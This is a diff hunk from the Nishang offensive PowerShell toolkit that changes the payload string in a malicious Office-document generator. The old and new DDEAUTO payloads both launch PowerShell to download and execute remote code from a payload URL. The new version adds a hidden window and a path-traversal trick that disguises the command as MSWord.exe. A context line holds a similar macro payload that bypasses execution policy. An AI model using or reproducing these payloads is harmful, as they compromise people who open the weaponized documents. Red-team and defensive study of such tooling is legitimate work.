@@ -201,7 +201,8 @@ https://github.com/samratashok/nishang
     if(!$Payload)
     {
         #Download-Execute payload for DDE
-        $DDEPayload = "DDEAUTO ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" "" iex(New-Object Net.WebClient).DownloadString('$PayloadURL');$Arguments"""
+        #https://twitter.com/SecuritySift/status/918563308541829120
+        $DDEPayload = "DDEAUTO ""C:\\Programs\\Microsoft\\Office\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -W Hidden -NoP iex(New-Object Net.WebClient).DownloadString('$PayloadURL');$Arguments #"" ""data"""
 
         #Download-Execure payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
